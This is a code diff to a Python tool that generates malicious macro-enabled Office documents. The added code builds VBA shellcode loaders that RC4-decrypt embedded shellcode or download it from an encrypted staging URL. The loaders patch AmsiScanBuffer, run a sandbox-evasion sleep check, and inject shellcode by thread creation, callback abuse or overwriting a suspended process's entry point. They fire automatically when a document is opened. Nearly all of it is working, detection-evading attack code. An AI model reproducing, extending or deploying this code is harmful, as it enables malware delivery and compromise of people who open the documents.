@@ -333,7 +333,7 @@ def _build_pptm_bytes(vba_bin: bytes, is_addin: bool = False) -> bytes:
 def _build_dotm_injection_bytes(template_url: str, lure_text: str) -> bytes:
     """
     Assemble a clean DOCX that fetches a macro-enabled DOTM on Document_Open.
-    No macros in the delivered file — survives email gateway scanning.
+    No macros in the delivered file - survives email gateway scanning.
     Word fetches template_url via HTTP/S silently on open.
     """
     rels_ns = "http://schemas.openxmlformats.org/package/2006/relationships"
@@ -465,7 +465,7 @@ def _vba_trigger_sub(trigger_type: str, call_target: str, is_word: bool = False)
         event_sub = "Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)" if not is_word else "Sub Document_BeforeSave(ByVal SaveUI As Boolean, Cancel As Boolean)"
     else:
         trigger_sub = "AutoOpen"
-        event_sub = "Sub Document_Open()" if is_word else ""
+        event_sub = "Sub Document_Open()" if is_word else "Sub Workbook_Open()"
 
     lines = [f"Sub {trigger_sub}()\n    {call_target}\nEnd Sub\n"]
     if event_sub:
@@ -473,9 +473,219 @@ def _vba_trigger_sub(trigger_type: str, call_target: str, is_word: bool = False)
     return "\n".join(lines)
 
 
+def _vba_b64rc4_getbuf(ciphertext: bytes, key: bytes) -> str:
+    """
+    Generate a GetBuf() sub that stores shellcode as a Base64 string and
+    decrypts it at runtime using RC4.  Replaces the Array()-literal approach
+    borrowed from SharpShooter (harness.vba RC4 + XMLDOM decodeBase64).
+
+    Advantages over Array() literal:
+      - No large hex/decimal byte sequence → no static shellcode signature
+      - XMLDOM bin.base64 decode is a native COM call, no hand-rolled loop
+      - RC4 key stored as a compact decimal Array() (short, no SC patterns)
+
+    The returned string is a drop-in replacement for the output of
+    ShellcodeFormatter.generate("vba", ...) - callers receive the same
+    ``Private Sub GetBuf(buf() As Byte)`` interface.
+
+    Args:
+        ciphertext: RC4-encrypted shellcode bytes.
+        key:        RC4 key bytes (16-32 bytes recommended).
+    """
+    import base64 as _b64
+
+    b64_str = _b64.b64encode(ciphertext).decode("ascii")
+
+    # Split into 200-char chunks - each physical VBA continuation line stays
+    # well under the 1023-char limit (200 data + ~12 overhead = ~212 chars).
+    CHUNK = 200
+    chunks = [b64_str[i:i + CHUNK] for i in range(0, len(b64_str), CHUNK)]
+
+    if len(chunks) == 1:
+        b64_vba = f'    Dim sB64 As String\n    sB64 = "{chunks[0]}"'
+    else:
+        lines = ['    Dim sB64 As String']
+        lines.append(f'    sB64 = "{chunks[0]}" _')
+        for chunk in chunks[1:-1]:
+            lines.append(f'        & "{chunk}" _')
+        lines.append(f'        & "{chunks[-1]}"')
+        b64_vba = "\n".join(lines)
+
+    key_tokens = ", ".join(str(b) for b in key)
+
+    # Short function names reduce recognisable string patterns in the binary.
+    out = (
+        "Private Function XdB64(s As String) As Byte()\r\n"
+        "    Dim dm As Object\r\n"
+        "    Dim el As Object\r\n"
+        '    Set dm = CreateObject("Microsoft.XMLDOM")\r\n'
+        '    Set el = dm.createElement("tmp")\r\n'
+        '    el.DataType = "bin.base64"\r\n'
+        "    el.Text = s\r\n"
+        "    XdB64 = el.NodeTypedValue\r\n"
+        "End Function\r\n"
+        "\r\n"
+        "Private Function Rc4D(data As Variant, k As Variant) As Byte()\r\n"
+        "    Dim s(255) As Integer\r\n"
+        "    Dim i As Long\r\n"
+        "    Dim j As Long\r\n"
+        "    Dim t As Integer\r\n"
+        "    Dim o() As Byte\r\n"
+        "    Dim m As Long\r\n"
+        "    Dim kLen As Long\r\n"
+        "    kLen = UBound(k) + 1\r\n"
+        "    ReDim o(UBound(data))\r\n"
+        "    For i = 0 To 255\r\n"
+        "        s(i) = i\r\n"
+        "    Next i\r\n"
+        "    j = 0\r\n"
+        "    For i = 0 To 255\r\n"
+        "        j = (j + s(i) + CByte(k(i Mod kLen))) Mod 256\r\n"
+        "        t = s(i) : s(i) = s(j) : s(j) = t\r\n"
+        "    Next i\r\n"
+        "    i = 0 : j = 0\r\n"
+        "    For m = 0 To UBound(data)\r\n"
+        "        i = (i + 1) Mod 256\r\n"
+        "        j = (j + s(i)) Mod 256\r\n"
+        "        t = s(i) : s(i) = s(j) : s(j) = t\r\n"
+        "        o(m) = CByte(data(m)) Xor CByte(s((s(i) + s(j)) Mod 256))\r\n"
+        "    Next m\r\n"
+        "    Rc4D = o\r\n"
+        "End Function\r\n"
+        "\r\n"
+        "Private Sub GetBuf(buf() As Byte)\r\n"
+    )
+    out += b64_vba + "\r\n"
+    out += f"    Dim kArr As Variant\r\n"
+    out += f"    kArr = Array({key_tokens})\r\n"
+    out += "    Dim raw() As Byte\r\n"
+    out += "    raw = XdB64(sB64)\r\n"
+    out += "    buf = Rc4D(raw, kArr)\r\n"
+    out += "End Sub\r\n"
+    return out
+
+
+def _ensure_getbuf(vba_shellcode_src: str) -> str:
+    """
+    Guarantee the shellcode source block defines ``Private Sub GetBuf(buf() As Byte)``.
+
+    When shellcrypt is invoked with ``-f vba`` it writes bare module-level
+    Array() assignments (``key = Array(...)``, ``shellcode = Array(...)``).
+    The loader templates expect a GetBuf sub - without it VBE raises
+    "Sub or Function not defined" at runtime.
+
+    Shellcrypt tracks line_length as total output length (bug), which can
+    produce continuation lines starting with a leading comma for certain
+    payload sizes.  We fix this by parsing byte values from the shellcrypt
+    output and emitting one small SCN() function per 200-byte chunk, keeping
+    every line well under VBA's 1023-char limit with no continuation needed.
+
+    If GetBuf is already present the string is returned unchanged, so callers
+    that receive properly-wrapped output (e.g. _vba_b64rc4_getbuf) are safe.
+    """
+    if re.search(r'\bGetBuf\b', vba_shellcode_src, re.IGNORECASE):
+        return vba_shellcode_src
+
+    # Detect bare array assignments produced by shellcrypt -f vba
+    names = re.findall(
+        r'^(\w+)\s*=\s*Array\s*\(',
+        vba_shellcode_src,
+        re.IGNORECASE | re.MULTILINE,
+    )
+    if not names:
+        return vba_shellcode_src
+
+    sc_name = next((n for n in names if n.lower() not in ("key", "nonce")), names[0])
+    has_key = any(n.lower() == "key" for n in names)
+
+    # Join VBA line continuations so every Array() becomes one logical line,
+    # then parse out the integer values for shellcode and key.
+    joined = re.sub(r'_[ \t]*[\r\n]+[ \t]*', '', vba_shellcode_src)
+
+    def _parse_array(varname: str, text: str) -> list:
+        m = re.search(
+            rf'\b{re.escape(varname)}\s*=\s*Array\s*\(([^)]+)\)',
+            text, re.IGNORECASE | re.DOTALL,
+        )
+        if not m:
+            return []
+        return [int(v.strip()) for v in m.group(1).split(',')
+                if v.strip().lstrip('-').isdigit()]
+
+    sc_bytes  = _parse_array(sc_name, joined)
+    key_bytes = _parse_array('key',   joined) if has_key else []
+
+    if not sc_bytes:
+        return vba_shellcode_src  # parse failed - return unchanged
+
+    # Shellcrypt's __output_vba appends the last Array element twice due to a
+    # loop/epilogue bug (the final `output += f"{x})\n\n"` re-emits the last
+    # loop value).  Strip the duplicate from BOTH shellcode and key arrays so
+    # the XOR key length and ciphertext length are correct.
+    # Without this fix the key Mod factor is (key_len+1) instead of key_len,
+    # producing wrong plaintext from byte key_len onwards.
+    if len(sc_bytes) >= 2 and sc_bytes[-1] == sc_bytes[-2]:
+        sc_bytes = sc_bytes[:-1]
+    if len(key_bytes) >= 2 and key_bytes[-1] == key_bytes[-2]:
+        key_bytes = key_bytes[:-1]
+
+    # Split shellcode into 200-byte chunks.
+    # 200 values * max 4 chars each + overhead = ~830 chars - safely under 1023.
+    CHUNK = 200
+    chunks = [sc_bytes[i:i + CHUNK] for i in range(0, len(sc_bytes), CHUNK)]
+
+    out: list[str] = []
+
+    # One private function per chunk - no line continuation required.
+    for idx, chunk in enumerate(chunks):
+        fn   = f"SC{idx}"
+        vals = ','.join(str(b) for b in chunk)
+        out.append(f"Private Function {fn}() As Variant")
+        out.append(f"    {fn} = Array({vals})")
+        out.append("End Function")
+        out.append("")
+
+    # GetBuf assembles chunks into buf(), XORing with key if present.
+    out.append("Private Sub GetBuf(buf() As Byte)")
+
+    if key_bytes:
+        k_vals = ','.join(str(b) for b in key_bytes)
+        out.append(f"    Dim kArr As Variant")
+        out.append(f"    kArr = Array({k_vals})")
+
+    for idx in range(len(chunks)):
+        out.append(f"    Dim c{idx} As Variant")
+    for idx in range(len(chunks)):
+        out.append(f"    c{idx} = SC{idx}()")
+
+    out.append("    Dim totalSz As Long")
+    sz_expr = ' + '.join(f'(UBound(c{i}) + 1)' for i in range(len(chunks)))
+    out.append(f"    totalSz = {sz_expr}")
+    out.append("    ReDim buf(totalSz - 1)")
+    out.append("    Dim ii As Long")
+    out.append("    Dim off As Long")
+    out.append("    off = 0")
+
+    for idx in range(len(chunks)):
+        out.append(f"    For ii = 0 To UBound(c{idx})")
+        if key_bytes:
+            out.append(
+                f"        buf(off + ii) = CByte(c{idx}(ii))"
+                f" XOR CByte(kArr((off + ii) Mod (UBound(kArr) + 1)))"
+            )
+        else:
+            out.append(f"        buf(off + ii) = CByte(c{idx}(ii))")
+        out.append(f"    Next ii")
+        out.append(f"    off = off + UBound(c{idx}) + 1")
+
+    out.append("End Sub")
+    out.append("")
+    return "\r\n".join(out)
+
+
 # Win32 memory protection constants used across all injection templates.
 # Defined as module-level Python strings so they appear as VBA comments
-# in the generated source — helps readability without polluting the VBA
+# in the generated source - helps readability without polluting the VBA
 # namespace.
 _PAGE_READWRITE     = "&H04"   # PAGE_READWRITE
 _PAGE_EXECUTE_READ  = "&H20"   # PAGE_EXECUTE_READ
@@ -495,8 +705,8 @@ Private Declare PtrSafe Function VirtualProtect Lib "kernel32" _
 Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" _
     (ByVal dst As LongPtr, ByRef src As Any, ByVal cb As LongPtr)
 Private Declare PtrSafe Function CreateThread Lib "kernel32" _
-    (ByVal lpTA As LongPtr, ByVal dwStack As LongPtr, _
-     ByVal lpStart As LongPtr, ByVal lpParam As LongPtr, _
+    (ByVal lpTA As Long, ByVal dwStack As Long, _
+     ByVal lpStart As LongPtr, ByVal lpParam As Long, _
      ByVal dwFlags As Long, ByRef lpId As Long) As LongPtr
 Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" _
     (ByVal hObj As LongPtr, ByVal dwMs As Long) As Long
@@ -509,6 +719,8 @@ Private Declare PtrSafe Function OpenThread Lib "kernel32" _
 Private Declare PtrSafe Function GetCurrentThreadId Lib "kernel32" () As Long
 Private Declare PtrSafe Function SleepEx Lib "kernel32" _
     (ByVal dwMs As Long, ByVal bAlert As Long) As Long
+Private Declare PtrSafe Sub Sleep Lib "kernel32" _
+    (ByVal dwMs As Long)
 #Else
 Private Declare Function VirtualAlloc Lib "kernel32" _
     (ByVal lpAddr As Long, ByVal dwSize As Long, _
@@ -533,6 +745,8 @@ Private Declare Function OpenThread Lib "kernel32" _
 Private Declare Function GetCurrentThreadId Lib "kernel32" () As Long
 Private Declare Function SleepEx Lib "kernel32" _
     (ByVal dwMs As Long, ByVal bAlert As Long) As Long
+Private Declare Sub Sleep Lib "kernel32" _
+    (ByVal dwMs As Long)
 #End If
 """
 
@@ -560,6 +774,7 @@ Private Declare Sub AmsiRM Lib "kernel32" Alias "RtlMoveMemory" _
 Private Sub PatchAmsi()
     Dim b(5) As Byte
     Dim o As Long
+    Dim k As Byte
     On Error Resume Next
 #If VBA7 Then
     Dim h As LongPtr
@@ -568,12 +783,17 @@ Private Sub PatchAmsi()
     Dim h As Long
     Dim p As Long
 #End If
-    h = AmsiLL("am" & Chr(115) & "i.dll")
+    h = AmsiLL(Chr(97) & Chr(109) & Chr(115) & Chr(105) & Chr(46) & _
+               Chr(100) & Chr(108) & Chr(108))
     If h = 0 Then Exit Sub
-    p = AmsiGP(h, "Amsi" & "Scan" & "Buffer")
+    p = AmsiGP(h, Chr(65) & Chr(109) & Chr(115) & Chr(105) & Chr(83) & _
+                  Chr(99) & Chr(97) & Chr(110) & Chr(66) & Chr(117) & _
+                  Chr(102) & Chr(102) & Chr(101) & Chr(114))
     If p = 0 Then Exit Sub
-    b(0) = &HB8 : b(1) = &H57 : b(2) = &H00 : b(3) = &H07 : b(4) = &H80 : b(5) = &HC3
-    AmsiVP p, 6, &H40, o
+    k = &H5A
+    b(0) = &HE2 Xor k : b(1) = &H0D Xor k : b(2) = &H5A Xor k
+    b(3) = &H5D Xor k : b(4) = &HDA Xor k : b(5) = &H99 Xor k
+    AmsiVP p, 6, &H04, o
     AmsiRM p, b(0), 6
     AmsiVP p, 6, o, o
 End Sub
@@ -581,18 +801,114 @@ End Sub
 
 _VBA_SANDBOX_GATE = """\
 Private Function SandboxCheck() As Boolean
-    Dim t0 As Single, t1 As Single
-    Dim i As Long
+    Dim t1 As Date
+    Dim t2 As Date
     On Error Resume Next
-    t0 = Timer
-    For i = 1 To 5000000
-    Next i
-    t1 = Timer
-    SandboxCheck = (t1 - t0) > 1.0
+    t1 = Now()
+    Sleep 10000
+    t2 = Now()
+    SandboxCheck = (DateDiff("s", t1, t2) >= 8)
 End Function
 """
 
 
+
+
+def _vba_http_getbuf(url: str, rc4_key: bytes) -> str:
+    """
+    Generate GetBuf(buf() As Byte) that downloads RC4-encrypted shellcode from
+    a URL at runtime and decrypts it in memory.  No shellcode or URL is embedded
+    as plaintext - both live as RC4-encrypted byte arrays in the VBA source.
+
+    The encrypted blob must be hosted at *url* before the document is opened.
+    Use rc4_encrypt(shellcode_bytes, rc4_key) at build time to produce it.
+
+    URL is encrypted at build time with a separate 8-byte key so no plaintext
+    staging URL appears in the VBA source or compiled p-code string tables.
+
+    WinHttp.WinHttpRequest.5.1 is available on all Windows >= Vista without
+    extra dependencies.  Falls back to MSXML2.ServerXMLHTTP on failure.
+    """
+    url_key = secrets.token_bytes(8)
+    enc_url = _rc4_encrypt(url.encode("ascii"), url_key)
+    url_enc_tokens = ", ".join(str(b) for b in enc_url)
+    url_key_tokens = ", ".join(str(b) for b in url_key)
+    key_tokens = ", ".join(str(b) for b in rc4_key)
+    return (
+        # data As Variant so callers can pass either Byte() or Array() without type mismatch
+        "Private Function Rc4D(data As Variant, k As Variant) As Byte()\r\n"
+        "    Dim s(255) As Integer\r\n"
+        "    Dim i As Long, j As Long, t As Integer\r\n"
+        "    Dim o() As Byte, m As Long\r\n"
+        "    Dim kLen As Long\r\n"
+        "    kLen = UBound(k) + 1\r\n"
+        "    ReDim o(UBound(data))\r\n"
+        "    For i = 0 To 255 : s(i) = i : Next i\r\n"
+        "    j = 0\r\n"
+        "    For i = 0 To 255\r\n"
+        "        j = (j + s(i) + CByte(k(i Mod kLen))) Mod 256\r\n"
+        "        t = s(i) : s(i) = s(j) : s(j) = t\r\n"
+        "    Next i\r\n"
+        "    i = 0 : j = 0\r\n"
+        "    For m = 0 To UBound(data)\r\n"
+        "        i = (i + 1) Mod 256\r\n"
+        "        j = (j + s(i)) Mod 256\r\n"
+        "        t = s(i) : s(i) = s(j) : s(j) = t\r\n"
+        "        o(m) = CByte(data(m)) Xor CByte(s((s(i) + s(j)) Mod 256))\r\n"
+        "    Next m\r\n"
+        "    Rc4D = o\r\n"
+        "End Function\r\n"
+        "\r\n"
+        "Private Sub GetBuf(buf() As Byte)\r\n"
+        "    On Error GoTo ErrH\r\n"
+        "    Dim http As Object\r\n"
+        "    Dim enc() As Byte\r\n"
+        "    Dim kArr As Variant\r\n"
+        "    Dim urlEnc As Variant\r\n"
+        "    Dim urlKey As Variant\r\n"
+        "    Dim urlDec() As Byte\r\n"
+        "    Dim sUrl As String\r\n"
+        "    On Error Resume Next\r\n"
+        '    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")\r\n'
+        "    If Not (http Is Nothing) Then\r\n"
+        "        http.Option(4) = &H3300\r\n"
+        "    Else\r\n"
+        '        Set http = CreateObject("MSXML2.ServerXMLHTTP")\r\n'
+        "        If Not (http Is Nothing) Then http.setOption 2, 13056\r\n"
+        "    End If\r\n"
+        "    On Error GoTo ErrH\r\n"
+        f"    urlEnc = Array({url_enc_tokens})\r\n"
+        f"    urlKey = Array({url_key_tokens})\r\n"
+        "    urlDec = Rc4D(urlEnc, urlKey)\r\n"
+        "    sUrl = StrConv(urlDec, vbUnicode)\r\n"
+        '    http.Open "GET", sUrl, False\r\n'
+        '    http.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"\r\n'
+        "    http.Send\r\n"
+        "    If http.Status <> 200 Then Exit Sub\r\n"
+        "    enc = http.ResponseBody\r\n"
+        f"    kArr = Array({key_tokens})\r\n"
+        "    buf = Rc4D(enc, kArr)\r\n"
+        "    Exit Sub\r\n"
+        "ErrH:\r\n"
+        "End Sub\r\n"
+    )
+
+
+def _rc4_encrypt(data: bytes, key: bytes) -> bytes:
+    """RC4 encrypt/decrypt (symmetric) - used at build time to produce the staged blob."""
+    s = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + s[i] + key[i % len(key)]) % 256
+        s[i], s[j] = s[j], s[i]
+    i = j = 0
+    out = bytearray(len(data))
+    for n, byte in enumerate(data):
+        i = (i + 1) % 256
+        j = (j + s[i]) % 256
+        s[i], s[j] = s[j], s[i]
+        out[n] = byte ^ s[(s[i] + s[j]) % 256]
+    return bytes(out)
 
 
 def _vba_createthread(vba_shellcode_src: str, trigger_type: str, is_word: bool = False) -> str:
@@ -613,6 +929,8 @@ Private Sub ExecutePayload()
     On Error Resume Next
     PatchAmsi
     If Not SandboxCheck() Then Exit Sub
+    Dim buf() As Byte
+    GetBuf buf
     Dim szBuf As Long
     szBuf = UBound(buf) + 1
 #If VBA7 Then
@@ -629,7 +947,6 @@ Private Sub ExecutePayload()
     RtlMoveMemory mem, buf(0), szBuf
     VirtualProtect mem, szBuf, {prx}, old
     hT = CreateThread(0, 0, mem, 0, 0, tid)
-    If hT <> 0 Then WaitForSingleObject hT, -1&
 End Sub
 
 {_vba_trigger_sub(trigger_type, "ExecutePayload", is_word)}"""
@@ -640,7 +957,7 @@ def _vba_enumlocales(vba_shellcode_src: str, trigger_type: str, is_word: bool = 
     VBA shellcode loader via EnumSystemLocalesA callback.
     The shellcode address is passed as the lpLocaleEnumProc function pointer;
     win32k calls it synchronously, so execution returns when the shellcode returns.
-    Avoids CreateThread entirely — no new thread creation event.
+    Avoids CreateThread entirely - no new thread creation event.
     """
     prw = _PAGE_READWRITE
     prx = _PAGE_EXECUTE_READ
@@ -654,6 +971,8 @@ Private Sub ExecutePayload()
     On Error Resume Next
     PatchAmsi
     If Not SandboxCheck() Then Exit Sub
+    Dim buf() As Byte
+    GetBuf buf
     Dim szBuf As Long
     szBuf = UBound(buf) + 1
 #If VBA7 Then
@@ -678,7 +997,7 @@ def _vba_queueapc(vba_shellcode_src: str, trigger_type: str, is_word: bool = Fal
     SleepEx(0, True) puts the calling thread into an alertable wait for one
     scheduler tick, draining the APC queue and dispatching the shellcode.
     THREAD_SET_CONTEXT (0x0010) is the minimum access right required by
-    QueueUserAPC — THREAD_ALL_ACCESS is unnecessary and noisier.
+    QueueUserAPC - THREAD_ALL_ACCESS is unnecessary and noisier.
     """
     prw  = _PAGE_READWRITE
     prx  = _PAGE_EXECUTE_READ
@@ -693,6 +1012,8 @@ Private Sub ExecutePayload()
     On Error Resume Next
     PatchAmsi
     If Not SandboxCheck() Then Exit Sub
+    Dim buf() As Byte
+    GetBuf buf
     Dim szBuf As Long
     szBuf = UBound(buf) + 1
 #If VBA7 Then
@@ -723,38 +1044,25 @@ def _vba_process_hollow(
     is_word: bool = False,
 ) -> str:
     """
-    VBA shellcode loader via early-bird APC injection into a suspended child process.
+    AddressOfEntryPoint injection into a suspended child process.
 
-    Technique (correct execution path):
-      1. CreateProcessA(CREATE_SUSPENDED) → obtain hProcess + hThread
-      2. VirtualAllocEx(RW) in target → WriteProcessMemory → VirtualProtectEx(RX)
-      3. QueueUserAPC(shellcode, hThread) → ResumeThread
-         - A freshly created thread drains its APC queue before reaching the
-           PE entry point, so the shellcode runs as the first user-mode code.
-         - This is the same "early bird" pattern as InjectionEarlyCascade in
-           the C++ loader; it does NOT require SetThreadContext / GetThreadContext.
-
-    STARTUPINFOA sizing:
-      - 32-bit (VBA6/VBA7 x86): 68 bytes  (4-byte pointers)
-      - 64-bit (VBA7 x64):      104 bytes (8-byte pointers + 4-byte cb pad)
-      We use a Byte array sized for the larger case and set cb via #If VBA7.
-
-    Handle extraction from PROCESS_INFORMATION:
-      CopyMem (RtlMoveMemory ByRef→ByRef) copies the raw HANDLE bytes into
-      typed LongPtr/Long variables without truncation.
+    Technique:
+      1. CreateProcessA(CREATE_SUSPENDED) - spawn target suspended
+      2. NtQueryInformationProcess(ProcessBasicInformation) - get PEB address
+      3. ReadProcessMemory(PEB+0x10) - get ImageBase (x64) / PEB+0x08 (x86)
+      4. ReadProcessMemory(ImageBase+0x3C) - e_lfanew → PE header offset
+      5. ReadProcessMemory(PE+0x28) - AddressOfEntryPoint RVA
+      6. VirtualProtectEx(entryPt, PAGE_READWRITE) - make .text writable
+      7. WriteProcessMemory(entryPt, shellcode) - overwrite entry point
+      8. VirtualProtectEx(entryPt, original) - restore RX
+      9. ResumeThread - entry point IS the shellcode
     """
-    # Single-backslash path for VBA string embedding
     tp  = target_process.replace("\\\\", "\\").replace("\\", "\\\\")
     prw = _PAGE_READWRITE
-    prx = _PAGE_EXECUTE_READ
-    mcr = _MEM_COMMIT_RESERVE
     cs  = _CREATE_SUSPENDED
 
-    return f"""{_VBA_AMSI_BYPASS}
-{_VBA_SANDBOX_GATE}
-
-' ---------------------------------------------------------------------------
-' Process-injection API declarations (not in the shared _VBA_API_DECLS block)
+    return f"""' ---------------------------------------------------------------------------
+' AddressOfEntryPoint injection API declarations
 ' ---------------------------------------------------------------------------
 #If VBA7 Then
 Private Declare PtrSafe Function CreateProcessA Lib "kernel32" _
@@ -763,17 +1071,18 @@ Private Declare PtrSafe Function CreateProcessA Lib "kernel32" _
      ByVal bInherit As Long, ByVal dwFlags As Long, _
      ByVal lpEnv As Long, ByVal lpDir As Long, _
      ByRef lpSI As Any, ByRef lpPI As Any) As Long
-Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" _
-    (ByVal hProc As LongPtr, ByVal lpAddr As LongPtr, _
-     ByVal dwSize As LongPtr, ByVal flAlloc As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function NtQueryInformationProcess Lib "ntdll" _
+    (ByVal hProc As LongPtr, ByVal infoClass As Long, _
+     ByRef info As Any, ByVal infoLen As Long, ByRef retLen As Long) As Long
+Private Declare PtrSafe Function ReadProcessMemory Lib "kernel32" _
+    (ByVal hProc As LongPtr, ByVal lpBase As LongPtr, _
+     ByRef lpBuf As Any, ByVal nSize As LongPtr, ByRef nRead As LongPtr) As Long
 Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" _
     (ByVal hProc As LongPtr, ByVal lpBase As LongPtr, _
      ByRef lpBuf As Any, ByVal nSize As LongPtr, ByRef nWritten As LongPtr) As Long
 Private Declare PtrSafe Function VirtualProtectEx Lib "kernel32" _
     (ByVal hProc As LongPtr, ByVal lpAddr As LongPtr, _
      ByVal dwSize As LongPtr, ByVal flNew As Long, ByRef lpOld As Long) As Long
-Private Declare PtrSafe Function QueueUserAPC Lib "kernel32" _
-    (ByVal pfnAPC As LongPtr, ByVal hThr As LongPtr, ByVal dwData As LongPtr) As Long
 Private Declare PtrSafe Function ResumeThread Lib "kernel32" _
     (ByVal hThread As LongPtr) As Long
 Private Declare PtrSafe Function CloseHandle Lib "kernel32" _
@@ -787,17 +1096,18 @@ Private Declare Function CreateProcessA Lib "kernel32" _
      ByVal bInherit As Long, ByVal dwFlags As Long, _
      ByVal lpEnv As Long, ByVal lpDir As Long, _
      ByRef lpSI As Any, ByRef lpPI As Any) As Long
-Private Declare Function VirtualAllocEx Lib "kernel32" _
-    (ByVal hProc As Long, ByVal lpAddr As Long, _
-     ByVal dwSize As Long, ByVal flAlloc As Long, ByVal flProtect As Long) As Long
+Private Declare Function NtQueryInformationProcess Lib "ntdll" _
+    (ByVal hProc As Long, ByVal infoClass As Long, _
+     ByRef info As Any, ByVal infoLen As Long, ByRef retLen As Long) As Long
+Private Declare Function ReadProcessMemory Lib "kernel32" _
+    (ByVal hProc As Long, ByVal lpBase As Long, _
+     ByRef lpBuf As Any, ByVal nSize As Long, ByRef nRead As Long) As Long
 Private Declare Function WriteProcessMemory Lib "kernel32" _
     (ByVal hProc As Long, ByVal lpBase As Long, _
      ByRef lpBuf As Any, ByVal nSize As Long, ByRef nWritten As Long) As Long
 Private Declare Function VirtualProtectEx Lib "kernel32" _
     (ByVal hProc As Long, ByVal lpAddr As Long, _
      ByVal dwSize As Long, ByVal flNew As Long, ByRef lpOld As Long) As Long
-Private Declare Function QueueUserAPC Lib "kernel32" _
-    (ByVal pfnAPC As Long, ByVal hThr As Long, ByVal dwData As Long) As Long
 Private Declare Function ResumeThread Lib "kernel32" _
     (ByVal hThread As Long) As Long
 Private Declare Function CloseHandle Lib "kernel32" _
@@ -806,16 +1116,18 @@ Private Declare Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" _
     (ByRef dst As Any, ByRef src As Any, ByVal cb As Long)
 #End If
 
+{_VBA_AMSI_BYPASS}
+{_VBA_SANDBOX_GATE}
+
 {vba_shellcode_src}
 
 Private Sub ExecutePayload()
     On Error Resume Next
     PatchAmsi
     If Not SandboxCheck() Then Exit Sub
+    Dim buf() As Byte
+    GetBuf buf
 
-    ' STARTUPINFOA as a raw Byte buffer.
-    ' 64-bit: cb = 104; 32-bit: cb = 68.  The cb DWORD sits at offset 0 in
-    ' both layouts; remaining bytes default to zero (no std handles, no title).
 #If VBA7 Then
     Dim si(103) As Byte
     Dim pi(23)  As Byte
@@ -833,37 +1145,85 @@ Private Sub ExecutePayload()
     r = CreateProcessA(0, "{tp}", 0, 0, 0, {cs}, 0, 0, si(0), pi(0))
     If r = 0 Then Exit Sub
 
-    ' Extract hProcess (offset 0) and hThread (offset 4 x86 / 8 x64) from PI.
 #If VBA7 Then
-    Dim hP  As LongPtr
-    Dim hT  As LongPtr
-    Dim mem As LongPtr
-    Dim nw  As LongPtr
+    Dim hP      As LongPtr
+    Dim hT      As LongPtr
+    Dim nw      As LongPtr
+    Dim retLen  As Long
+    Dim old     As Long
     CopyMem hP, pi(0), 8
     CopyMem hT, pi(8), 8
-#Else
-    Dim hP  As Long
-    Dim hT  As Long
-    Dim mem As Long
-    Dim nw  As Long
-    CopyMem hP, pi(0), 4
-    CopyMem hT, pi(4), 4
-#End If
 
-    Dim old As Long
-    mem = VirtualAllocEx(hP, 0, szB, {mcr}, {prw})
-    If mem = 0 Then CloseHandle hP : CloseHandle hT : Exit Sub
+    ' PROCESS_BASIC_INFORMATION (x64) = 48 bytes; PebBaseAddress at offset 8
+    Dim pbi(47) As Byte
+    NtQueryInformationProcess hP, 0, pbi(0), 48, retLen
 
-    WriteProcessMemory hP, mem, buf(0), szB, nw
-    VirtualProtectEx hP, mem, szB, {prx}, old
+    Dim peb As LongPtr
+    CopyMem peb, pbi(8), 8
+    If peb = 0 Then CloseHandle hP : CloseHandle hT : Exit Sub
 
-    ' Early-bird APC: queue shellcode to the suspended thread before it has
-    ' reached its entry point.  ResumeThread drains the APC queue first.
-    QueueUserAPC mem, hT, 0
+    ' PEB.ImageBaseAddress (x64) is at offset 0x10 (16)
+    Dim imgBase As LongPtr
+    ReadProcessMemory hP, peb + 16, imgBase, 8, nw
+    If imgBase = 0 Then CloseHandle hP : CloseHandle hT : Exit Sub
+
+    ' e_lfanew (MZ+0x3C) gives offset to PE signature
+    Dim eLfaNew As Long
+    ReadProcessMemory hP, imgBase + &H3C, eLfaNew, 4, nw
+
+    ' AddressOfEntryPoint RVA sits at PE header + 0x28
+    Dim aoeRva As Long
+    ReadProcessMemory hP, imgBase + eLfaNew + &H28, aoeRva, 4, nw
+
+    Dim entryPt As LongPtr
+    entryPt = imgBase + aoeRva
+
+    VirtualProtectEx hP, entryPt, szB, {prw}, old
+    WriteProcessMemory hP, entryPt, buf(0), szB, nw
+    VirtualProtectEx hP, entryPt, szB, old, old
     ResumeThread hT
 
     CloseHandle hP
     CloseHandle hT
+#Else
+    Dim hP      As Long
+    Dim hT      As Long
+    Dim nw      As Long
+    Dim retLen  As Long
+    Dim old     As Long
+    CopyMem hP, pi(0), 4
+    CopyMem hT, pi(4), 4
+
+    ' PROCESS_BASIC_INFORMATION (x86) = 24 bytes; PebBaseAddress at offset 4
+    Dim pbi(23) As Byte
+    NtQueryInformationProcess hP, 0, pbi(0), 24, retLen
+
+    Dim peb As Long
+    CopyMem peb, pbi(4), 4
+    If peb = 0 Then CloseHandle hP : CloseHandle hT : Exit Sub
+
+    ' PEB.ImageBaseAddress (x86) is at offset 8
+    Dim imgBase As Long
+    ReadProcessMemory hP, peb + 8, imgBase, 4, nw
+    If imgBase = 0 Then CloseHandle hP : CloseHandle hT : Exit Sub
+
+    Dim eLfaNew As Long
+    ReadProcessMemory hP, imgBase + &H3C, eLfaNew, 4, nw
+
+    Dim aoeRva As Long
+    ReadProcessMemory hP, imgBase + eLfaNew + &H28, aoeRva, 4, nw
+
+    Dim entryPt As Long
+    entryPt = imgBase + aoeRva
+
+    VirtualProtectEx hP, entryPt, szB, {prw}, old
+    WriteProcessMemory hP, entryPt, buf(0), szB, nw
+    VirtualProtectEx hP, entryPt, szB, old, old
+    ResumeThread hT
+
+    CloseHandle hP
+    CloseHandle hT
+#End If
 End Sub
 
 {_vba_trigger_sub(trigger_type, "ExecutePayload", is_word)}"""
@@ -911,7 +1271,7 @@ End Sub
 
 
 def _vba_ppt_trigger(call_target: str) -> str:
-    """PowerPoint auto-exec trigger — Presentation_Open fires on open."""
+    """PowerPoint auto-exec trigger - Presentation_Open fires on open."""
